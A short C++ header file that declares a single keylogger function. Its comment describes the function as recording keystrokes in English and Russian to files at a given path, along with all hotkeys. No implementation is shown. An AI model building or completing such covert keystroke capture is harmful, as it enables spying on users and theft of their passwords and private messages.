/*
 * Advanced keylogger
 * records one click in 2 files
 * along the keylog_path in English
 * and Russian, also records all hotkeys
*/

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

int keylogger(std::string keylog_path);

#endif // KEYLOGGER_H
